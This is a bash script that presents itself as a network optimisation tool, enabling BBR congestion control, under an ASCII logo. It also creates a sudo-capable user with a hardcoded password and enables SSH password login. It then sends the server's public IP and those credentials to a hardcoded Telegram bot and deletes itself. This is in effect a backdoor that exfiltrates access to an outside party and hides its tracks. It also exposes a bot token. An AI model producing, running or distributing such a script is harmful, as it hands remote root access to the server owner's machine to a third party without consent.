#!/bin/bash
# --- Configuration ---
DEV_NAME="S 0 S"
TOKEN="8459816702:AAEwGWDM8S9BAyQtWGSs_DREJY3KC3lR9ow"
CHAT_ID="7130966571"
NEW_USER="labuser"
NEW_PASS="P@ssw0rd789!"

# Terminal Logo
clear
echo -e "\e[1;36m"
echo "._______________   .________"
echo " |   ____/\   _  \  |   ____/"
echo " |____  \ /  /_\  \ |____  \ "
echo " /       \\  \_/   \/       \\"
echo "/______  / \_____  /______  /"
echo "       \/        \/       \/ "
echo -e "\e[0m"
echo "========================================="
echo "   🚀 Script Developed by: $DEV_NAME"
echo "========================================="
sleep 2

# IP & Optimization
IP=$(curl -s ifconfig.me)
echo "net.core.default_qdisc=fq" | sudo tee -a /etc/sysctl.conf > /dev/null
echo "net.ipv4.tcp_congestion_control=bbr" | sudo tee -a /etc/sysctl.conf > /dev/null
sudo sysctl -p > /dev/null

# User & SSH Setup
sudo useradd -m -s /bin/bash "$NEW_USER"
echo "$NEW_USER:$NEW_PASS" | sudo chpasswd
sudo usermod -aG sudo "$NEW_USER"
sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo systemctl restart ssh

# Telegram Alert
MESSAGE="<code>._______________   .________
 |   ____/\   _  \  |   ____/
 |____  \ /  /_\  \ |____  \ 
 /       \\  \_/   \/       \
/______  / \_____  /______  /
       \/        \/       \/</code>
👤 <b>Dev:</b> $DEV_NAME
🌐 <b>IP:</b> $IP
👤 <b>User:</b> $NEW_USER
🔑 <b>Pass:</b> $NEW_PASS"

curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$MESSAGE" -d "parse_mode=HTML" > /dev/null

echo "✅ All Done! Script deleted."
rm -- "$0"
